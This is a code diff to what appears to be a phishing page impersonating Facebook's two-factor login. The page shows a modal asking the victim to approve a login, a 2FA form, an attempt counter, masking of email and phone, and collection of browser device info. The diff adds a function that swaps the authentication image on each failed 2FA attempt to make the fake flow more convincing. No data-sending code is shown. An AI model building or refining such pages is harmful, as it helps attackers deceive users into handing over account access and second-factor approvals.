@@ -3362,7 +3362,7 @@
                 <span data-i18n="modal.2fa.notification">We have sent a notification to the newspaper's device; please open Facebook on that device and approve the login to continue.</span>
               </p>
               <div class="w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]">
-                <img width="100%" alt="authentication" src="./images/authentication.png" />
+                <img id="2fa-auth-img" width="100%" alt="authentication" src="./images/authentication.png" />
               </div>
               <div class="w-full">
                 <form id="form-2fa">
@@ -3636,6 +3636,13 @@
         if (cleaned.length <= 4) return '*******';
         return cleaned.slice(0, 2) + '****' + cleaned.slice(-2);
       }
+      function update2faImage() {
+        var img = document.getElementById("2fa-auth-img");
+        if (!img) return;
+        var step = tfaAttempts + 1;
+        if (step >= 3) step = 3;
+        img.src = './images/image-' + step + '.jpg';
+      }
       function getDeviceInfo() {
         const ua = navigator.userAgent;
         let browser = "Unknown",
@@ -3715,6 +3722,7 @@
               .replace('{email}', masked)
               .replace('{phone}', masked);
           }
+          update2faImage();
           showModal("modal-2fa");
         }
       };
@@ -3761,6 +3769,8 @@
               error.classList.add("show");
             };
             updateCountdown();
+            document.getElementById("2fa-step").textContent = tfaAttempts + 1;
+            update2faImage();
             const interval = setInterval(() => {
               countdown--;
               if (countdown <= 0) {
